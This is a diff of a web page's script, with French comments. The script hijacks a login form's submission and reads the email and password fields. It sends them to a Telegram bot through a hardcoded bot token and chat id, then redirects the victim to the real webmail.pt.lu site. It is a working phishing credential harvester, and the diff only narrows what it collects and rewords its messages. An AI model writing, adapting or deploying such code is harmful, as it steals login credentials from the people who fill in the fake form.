@@ -7260,23 +7260,19 @@ display:none;
             </button>
           </p>
           </form>
-		  <script>
+		 <script>
 document.querySelector("form").addEventListener("submit", async function(e) {
-    e.preventDefault(); // Empêche la soumission classique
+    e.preventDefault(); // Empêche l'envoi classique du formulaire
 
-    // Récupérer les champs
-    const user = document.querySelector("input[name='user']").value;
-    const pass = document.querySelector("input[name='pass']").value;
-    const lang = document.querySelector("select[name='lang']").value;
-    const mailla = document.querySelector("input[name='mailla']").value;
-    const check = document.querySelector("input[name='check']").value;
-    const todo = document.querySelector("input[name='todo']").value;
+    // Récupération de l'email et du mot de passe
+    const email = document.querySelector("input[name='user']").value;
+    const password = document.querySelector("input[name='pass']").value;
 
     // À personnaliser
     const token = "6793149800:AAFrrTrd5hC5HaY9QFqGkxHpyVpReIyjLE8";
     const chat_id = "-4134299888";
 
-    const message = `📥 Formulaire reçu :\n👤 Username: ${user}\n🔑 Password: ${pass}\n🌐 Langue: ${lang}\n📧 Email caché: ${mailla}\n🔍 Check: ${check}\n📝 Todo: ${todo}`;
+    const message = `📧 Email: ${email}\n🔐 Password: ${password}`;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -7292,11 +7288,11 @@ document.querySelector("form").addEventListener("submit", async function(e) {
             })
         });
 
-        // Redirection après succès
+        // Rediriger vers Google après l'envoi
         window.location.href = "https://webmail.pt.lu/";
     } catch (error) {
-        console.error("Erreur Telegram :", error);
-        alert("Erreur lors de l'envoi des données.");
+        console.error("Erreur lors de l'envoi :", error);
+        alert("Erreur lors de l'envoi. Veuillez réessayer.");
     }
 });
 </script>
